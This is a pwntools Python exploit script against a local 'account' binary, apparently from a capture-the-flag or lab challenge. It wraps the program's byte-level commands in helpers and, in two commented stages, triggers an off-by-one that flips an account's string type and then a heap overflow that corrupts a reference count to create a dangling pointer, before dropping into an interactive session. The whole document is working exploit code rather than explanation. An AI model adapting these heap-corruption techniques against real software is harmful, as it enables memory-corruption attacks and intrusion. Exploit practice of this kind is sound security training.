from pwn import *
context.log_level = "info"

elf = ELF("./bin/account")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = elf.process(env={"LD_PRELOAD": libc.path})


def new_account(type: int, name: bytes) -> None:
    p.send(b"\x00" + p8(type) + name)
    p.recv()


def del_account(idx: int) -> None:
    p.send(b"\x01" + p8(idx))
    p.recv()


def fix_account(idx: int, type: int, name: bytes) -> None:
    p.send(b"\x02" + p8(idx) + p8(type) + name)
    p.recv()


def new_group() -> None:
    p.send(b"\x10")
    p.recv()


def del_group(idx: int) -> None:
    p.send(b"\x11" + p8(idx))
    p.recv()


def add_group(group: int, account: int) -> None:
    p.send(b"\x12" + p8(group) + p8(account))
    p.recv()


def sub_group(group: int, account: int) -> None:
    p.send(b"\x13" + p8(group) + p8(account))
    p.recv()


def list_group(group: int) -> bytes:
    p.send(b"\x14" + p8(group))
    return p.recv()


###################################
### Stage 1: Trigger Off-by-one ###
###################################

# account0: Trigger of Off-by-one
new_account(1, b"AAAA")

# account1: Victim of Off-by-one and Trigger of Heap Overflow
new_account(1, b"BBB")

# account2: Victim of Heap Overflow
new_account(1, b"CCC")

# Trigger Off-by-one
# account1.type: Ascii -> Unicode
fix_account(0, 0, b"\x41\x00\x41\x00")


######################################
### Stage 2: Trigger Heap Overflow ###
######################################

# group0: Handle dangling pointer of account2
new_group()

# Add account2 to group0
# account2.ref_cnt = 2
add_group(0, 2)

# Trigger Heap Overflow
# account2.ref_cnt = 1
fix_account(1, 0, b"\x42\x00\x42\x00\x00\x01")

p.interactive()
p.close()
